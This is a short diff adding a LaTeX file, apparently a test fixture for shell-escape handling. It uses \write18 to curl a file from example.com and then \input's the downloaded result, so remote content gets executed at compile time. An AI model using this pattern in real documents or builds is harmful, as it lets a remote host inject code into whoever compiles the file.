@@ -1,0 +1,6 @@
+% Downloads a file from the internet with a shell command.
+\documentclass{article}
+\begin{document}
+\immediate\write18{curl -s -o pwned.tex http://example.com/}
+\input{pwned}
+\end{document}
